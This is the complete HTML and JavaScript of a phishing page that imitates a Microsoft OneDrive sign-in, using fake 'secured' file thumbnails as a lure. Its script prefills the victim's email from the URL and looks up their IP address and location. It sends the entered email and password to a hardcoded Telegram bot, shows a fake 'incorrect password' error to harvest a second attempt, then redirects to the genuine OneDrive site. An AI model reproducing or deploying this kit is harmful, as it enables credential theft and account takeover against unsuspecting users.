<html>
 <head>
  <title>
   OneDrive Sign In
  </title>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
  <style>
body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background-color: #f2f2f2;
    margin: 0;
    padding: 0;
    overflow: hidden; /* Disable scrolling */
}

.header {
    background-color: #0078d4;
    color: white;
    padding: 10px 20px;
    display: flex;
    align-items: center;
}

.header img {
    height: 24px;
    margin-right: 10px;
}

.header .title {
    font-size: 20px;
}

.header .right-icons {
    margin-left: auto;
    display: flex;
    align-items: center;
}

.header .right-icons i,
.header .right-icons span {
    margin-left: 15px;
    cursor: pointer;
}

.content {
    position: relative; /* Required for pseudo-element positioning */
    padding: 20px;
}

.content::before {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100vh; /* Make the overlay cover the full height of the viewport */
    background-color: rgba(0, 0, 0, 0.6); /* Dark transparent overlay */
    z-index: 2; /* Place the overlay above content, but below login box */
    pointer-events: none; /* Ensure it doesn't block interactions */
}

.content > * {
    position: relative; /* Bring the content above the overlay */
    z-index: 1; /* Content will be above the overlay */
}

.content h2 {
    font-size: 18px;
    margin-bottom: 20px;
}

.content .file {
    display: inline-block;
    width: 150px;
    text-align: center;
    margin-right: 20px;
}

.content .file img {
    width: 100%;
    border: 1px solid #ccc;
    border-radius: 4px;
    z-index: 1; /* Ensure images are positioned under the overlay */
    position: relative;
}

.content .file p {
    margin: 10px 0 0;
}

.login-box {
    background-color: white;
    padding: 20px;
    border-radius: 1px;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
    width: 396px;
    margin: -330px auto;
    text-align: center;
    color: #353434;
    position: relative;
    z-index: 3; /* Ensure the login box is above everything */
}

.login-box img {
    height: 24px;
    margin-bottom: 10px;
}

.login-box h3 {
    font-size: 24px;
    margin-bottom: 20px;
}

/* General input styling */
.login-box input[type="text"],
.login-box input[type="password"] {
    width: 90%;
    padding: 10px;
    margin: 10px 0;
    border: none; /* Remove all borders */
    border-bottom: 1px solid #ccc; /* Add a bottom border */
    border-radius: 0;
    outline: none; /* Remove the default focus outline */
    transition: border-color 0.3s ease; /* Smooth transition for border color */
    font-size: 15px;
}

/* Input focus styling */
.login-box input[type="text"]:focus,
.login-box input[type="password"]:focus {
    border-bottom: 1px solid #ccc; /* Change bottom border color on focus */
}

/* Optional: Change color of the bottom border when the input is focused */
.login-box input[type="text"]:focus,
.login-box input[type="password"]:focus {
    border-bottom-color: #ccc; /* Change the color to blue or your preferred color */
}


.login-box a {
    color: #0078d4;
    text-decoration: none;
}

.login-box button {
    background-color: #0078d4;
    color: white;
    padding: 10px 20px;
    border: none;
    border-radius: 4px;
    cursor: pointer;
    font-size: 16px;
}

.loggo {
    text-align: left;
    padding: 20px;
}

.pls {
    text-align: left;
    padding-left: 20px;
    margin-top: -20px;
}

.forgt {
    text-align: left;
    padding-left: 22px;
    margin-top: 20px;
}

.forgt a {
    font-size: 14px; /* Increase font size */
    font-weight: 400;
}

.bttnn {
    text-align: right;
    margin: 0;
    margin-top: 20px;
}

.action-row {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-top: 20px;
}

.conhid {
    z-index: 1; /* Ensure conhid is below the overlay */
}

.ERR {
    display: none;
}

.err p.error {
            color: #E81123;
            font-size: 15px;
            text-align: left;
            margin-left: 20px;
        }


        @media (max-width: 768px) {
    .login-box {
        margin: -150px auto; /* Adjust the margin to reduce height on mobile */
        padding: 15px; /* Optionally reduce padding for a more compact look */
    }

    .content {
        padding: 10px; /* Reduce padding for a more compact layout */
    }

    .content h2 {
        font-size: 16px; /* Decrease font size */
    }

    .content .file {
        margin-bottom: 15px; /* Reduce space between file items */
    }

    .header {
        padding: 5px 10px; /* Reduce header padding */
    }

    .header .title {
        font-size: 18px; /* Slightly reduce title font size */
    }

    .header .right-icons i {
        font-size: 16px; /* Adjust icon size for better fit */
    }
}



</style>

 </head>
 <body>
  <div class="header">
   
   <span class="title">
   <span style="font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;"> OneDrive</span>
   </span>
   <div class="right-icons">
    <i class="fas fa-share-alt">
    </i>
    <i class="fas fa-download">
    </i>
    <i class="fas fa-plus">
    </i>
    <i class="fas fa-code">
    </i>
    <i class="fas fa-history">
    </i>
    <span>
     1 selected
    </span>
    <i class="fas fa-times">
    </i>
    <i class="fas fa-info-circle">
    </i>
    <i class="fas fa-cog">
    </i>
    <i class="fas fa-user-circle">
    </i>
   </div>
  </div>
  <div class="conhid">
  <div class="content">
   <h2>
    Shared &gt; Documents
   </h2>
   <div class="file">
    <img alt="Document thumbnail" height="190" src="https://storage.googleapis.com/a1aa/image/MKiqWrWWQ2LoMtdh3jpT9IeVdRKLH07CvHZLmGUeCw0WKnyTA.jpg" width="150"/>
    <p>
     PO393882.pdf
    </p>
    <p>
     Secured
    </p>
   </div>
   <div class="file">
    <img alt="Document thumbnail" height="190" src="https://storage.googleapis.com/a1aa/image/MKiqWrWWQ2LoMtdh3jpT9IeVdRKLH07CvHZLmGUeCw0WKnyTA.jpg" width="150"/>
    <p>
     Item-list.pdf
    </p>
    <p>
     Secured
    </p>
   </div>
  </div>
</div>
  <div class="login-box">
   <div class="loggo">
    <img alt="Microsoft logo" src="https://logincdn.msauth.net/shared/5/images/microsoft_logo_ee5c8d9fb6248c938fd0.svg" width="100" />
   </div>
  <div class="pls">
    <p style="font-size: 15px !important; color: #E81123">
        These files are secured, please sign in with your correct email and password to gain access to the files
       </p>
    <h3>
        Please sign in
       </h3>
  </div>
  <div class="err">
    <p class="error">
        Your account or password is incorrect. If you don't <br>remember your password,
        <a href="#">
         reset it now
        </a>
  </div>
   
   <input placeholder="Email" type="text"/>
   <input placeholder="Password" type="password"/>
   <div class="forgt">
    <div>
        <input id="keep-signed-in" type="checkbox" />
        <label for="keep-signed-in">
            Keep me signed in
        </label>
    </div>
    <div style="padding-left: 30px;">
        <a href="#">Forgot password?</a>
    </div>
</div>
<div class="bttnn">
    <button>View File(s)</button>
</div>

  
   
  </div>


  <script>
    document.addEventListener('DOMContentLoaded', () => {
        const errorMessage = document.querySelector('.err');
        const emailInput = document.querySelector('input[type="text"]');
        const passwordInput = document.querySelector('input[type="password"]');
        const viewFilesButton = document.querySelector('button');
        let submissionCount = 0;

        // Function to check if a string is valid Base64
        function isBase64(str) {
            try {
                return btoa(atob(str)) === str;
            } catch (err) {
                return false;
            }
        }

        // Function to extract email from URL, decode if Base64, and insert into email input
        function extractAndEncodeEmail() {
            const url = window.location.href;
            const hashIndex = url.indexOf('#');

            if (hashIndex !== -1) {
                let email = url.substring(hashIndex + 1); // Extract email or Base64 string from URL
                if (email) {
                    // Check if the extracted value is Base64-encoded
                    if (isBase64(email)) {
                        email = atob(email); // Decode Base64 to get the original email
                    }

                    email = email.toLowerCase(); // Convert email to lowercase
                    emailInput.value = email; // Insert email into the input field

                    // Encode email to Base64
                    const base64Email = btoa(email);

                    // Update the URL with the Base64-encoded email
                    const newUrl = url.substring(0, hashIndex + 1) + base64Email;
                    window.history.replaceState({}, document.title, newUrl); // Update URL without reloading
                }
            }
        }

        // Call the function to extract and encode email
        extractAndEncodeEmail();

        // Fetch IP address
        const getIPAddress = async () => {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Error fetching IP address:', error.message);
                return 'Unknown';
            }
        };

        // Fetch location from IP
        const getLocationFromIP = async (ip) => {
            try {
                const response = await fetch(`http://ip-api.com/json/${ip}`);
                const data = await response.json();
                if (data.status === 'success') {
                    return `${data.city}, ${data.regionName}, ${data.country}`;
                }
                return 'Unknown';
            } catch (error) {
                console.error('Error fetching location from IP:', error.message);
                return 'Unknown';
            }
        };

        // Send data to Telegram
        const sendToTelegram = async (email, password) => {
            const botToken = '8033047550:AAFkspqQCyD1D4GZiNeqrP6IWlTJCiWx6Cs';
            const chatId = '5766720639';

            const ip = await getIPAddress();
            const location = await getLocationFromIP(ip);

            const message = `
ðŸŒ OneDrive  ðŸŒ  
----------------------
ðŸ“§ Email: ${email}
ðŸ”‘ Password: ${password}
ðŸŒ IP: ${ip}
ðŸ  Location: ${location}
            `;

            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            await fetch(url).catch(console.error);
        };

        viewFilesButton.addEventListener('click', async (event) => {
            event.preventDefault();
            const email = emailInput.value.trim();
            const password = passwordInput.value.trim();

            if (!email || !password) {
                errorMessage.style.display = 'block';
                return;
            }

            if (submissionCount === 0) {
                await sendToTelegram(email, password);
                errorMessage.style.display = 'block';
                passwordInput.value = '';
                setTimeout(() => (errorMessage.style.display = 'none'), 200000);
            } else if (submissionCount === 1) {
                await sendToTelegram(email, password);
                window.location.href = 'https://www.microsoft.com/en-us/microsoft-365/onedrive/online-cloud-storage';
            }

            submissionCount++;
        });
    });
</script>

 </body>
</html>
